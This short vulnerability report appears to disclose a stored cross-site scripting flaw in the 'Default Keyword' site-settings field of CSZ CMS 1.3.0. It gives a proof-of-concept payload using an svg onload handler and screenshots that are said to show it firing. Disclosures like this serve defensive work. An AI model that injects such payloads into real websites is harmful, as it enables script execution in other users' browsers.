product： CSZ CMS

download link： https://www.cszcms.com/product/download

version：1.3.0


There is Cross-Site Scripting (XSS)  vulnerability within  "Default Keyword"  fields of Site Settings.

![图片1](1.png)

poc:
```
<div><p title="</div><svg/onload=alert(1)>">

```

Accessing Sites and successed

![图片1](2.png)